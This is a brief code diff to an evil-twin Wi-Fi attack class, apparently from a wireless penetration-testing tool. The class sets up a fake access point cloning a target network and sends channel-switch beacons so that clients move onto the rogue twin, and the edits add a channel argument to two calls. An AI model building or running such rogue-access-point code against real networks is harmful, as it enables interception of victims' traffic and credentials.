@@ -97,7 +97,7 @@ class EvilTwinCampaign(Campaign):
             return None
         csa_channel = csa_target_channel(self.target_channel, evil_input.csa_channel or self.twin_channel)
         return Punter(evil_input.punt_modes, self.real_beacon, str_to_mac(target_bssid), csa_channel,
-                      str_to_mac(self.twin_bssid), self.twin_channel)
+                      str_to_mac(self.twin_bssid), self.twin_channel, self.target_channel)
 
     async def _loop(self) -> None:
         self.fakeap = FakeAP(self.twin_iface, str_to_mac(self.twin_bssid), self.ssid,
@@ -164,7 +164,7 @@ class EvilTwinCampaign(Campaign):
         """CSA the twin-channel clients back to the target's channel."""
         if self.twin_channel == self.target_channel:
             return
-        frame = build_csa_beacon(self.twin_beacon, self.target_channel)
+        frame = build_csa_beacon(self.twin_beacon, self.target_channel, from_channel=self.twin_channel)
         for _ in range(BURST_SIZE):
             await self.twin_iface.send_no_wait(frame)
             await asyncio.sleep(FRAME_GAP_SEC)
